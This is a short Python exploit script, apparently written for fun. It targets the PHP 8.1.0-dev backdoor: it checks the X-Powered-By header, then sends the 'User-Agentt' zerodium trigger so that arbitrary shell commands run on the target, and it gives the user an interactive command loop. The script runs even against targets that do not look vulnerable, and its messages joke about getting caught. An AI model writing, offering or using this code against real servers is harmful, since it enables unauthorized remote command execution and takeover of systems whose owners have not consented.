#Created by Raihan Sultan IN 2024
#This thing been patched up 3 years ago lmao
#Know what, just have fun ig

import requests
from cmd import Cmd
import re
import sys

if len(sys.argv) != 2:
    print("To use, simply write: python3 ExploitScript.py <URL> ((you might wanna use IP then use it as http))")
    sys.exit()

url = sys.argv[1]

class Terminal(Cmd):
    prompt = "$ > "
    def default(self, args):
        exploiter(args)

def check_version():
    global url
    print("PHP Version 8.1.0-Dev Exploit (Permission Granted)((Can Confirm))(((No?)))")
    print("I uh... Checking PHP version . . . ")
    version = requests.get(url)
    version = version.headers
    php_version = version['X-Powered-By']
    print(f"PHP version is: {php_version}")
    if "8.1.0-dev" in php_version:
        print("Can Confirm this vulnerable.")
        print("Just wanna make sure you REALLY got permission for this.")
        print("Ight then, Wait, exploit is working (Permission Granted)((I Can confirm))")
    else:
        print("Diz aint seem vulnerable no")
        print("Running the exploit (Permission Granted) anyway, lmao (it's you who gonna get caught anyway")
def exploiter(command):
    global url
    session = requests.session()
    header = {"User-Agentt" : "zerodiumvar_dump(system($_REQUEST['cmd']));"}
    data = {"cmd" : f"{command} 2>&1; echo 'end_of_command'"}
    output = session.post(url, data = data, headers = header)
    output = re.search("(.*?)end_of_command", output.text, re.DOTALL).group(1)
    print(output)
    if not output:
        print("Error")

if __name__ == ("__main__"):
    check_version()
    terminal = Terminal()
    terminal.cmdloop()